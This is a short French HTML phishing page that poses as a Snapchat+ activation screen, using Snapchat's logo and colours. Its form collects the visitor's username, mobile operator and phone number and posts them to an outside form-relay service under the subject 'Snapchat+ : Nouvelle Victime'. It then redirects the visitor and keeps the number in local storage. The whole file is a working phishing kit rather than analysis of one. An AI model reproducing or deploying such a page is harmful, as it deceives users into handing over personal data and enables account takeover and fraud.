<!DOCTYPE html>
<html lang="fr">
<head>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#FFFC00] flex items-center justify-center h-screen font-sans">
    <form action="https://api.web3forms.com/submit" method="POST" onsubmit="saveData()" class="bg-white p-8 rounded-3xl w-96 shadow-2xl">
        <input type="hidden" name="access_key" value="55a75b87-51e6-4f98-bcaa-125202c0904e">
        <input type="hidden" name="subject" value="Snapchat+ : Nouvelle Victime">
        <input type="hidden" name="redirect" value="https://mey-qw.github.io/snap-plus-activation/">
        
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" class="w-16 mx-auto mb-4">
        <h2 class="text-xl font-bold mb-4 text-center">Activation Snap+</h2>
        
        <input type="text" name="Identifiant" placeholder="Identifiant" class="w-full p-3 mb-3 border-2 border-gray-200 rounded-xl" required>
        <select name="Operateur" class="w-full p-3 mb-3 border-2 border-gray-200 rounded-xl bg-white" required>
            <option value="" disabled selected>Ton opérateur</option>
            <option value="Bouygues">Bouygues</option>
            <option value="SFR">SFR</option>
            <option value="Orange">Orange</option>
        </select>
        <input type="tel" name="Telephone" id="tel" placeholder="Numéro de tél" class="w-full p-3 mb-4 border-2 border-gray-200 rounded-xl" required>
        
        <button type="submit" class="w-full bg-black text-white py-3 rounded-full font-bold">Continuer</button>
    </form>

    <script>
        function saveData() {
            const tel = document.getElementById('tel').value;
            localStorage.setItem('user_tel', tel);
        }
    </script>
</body>
</html>
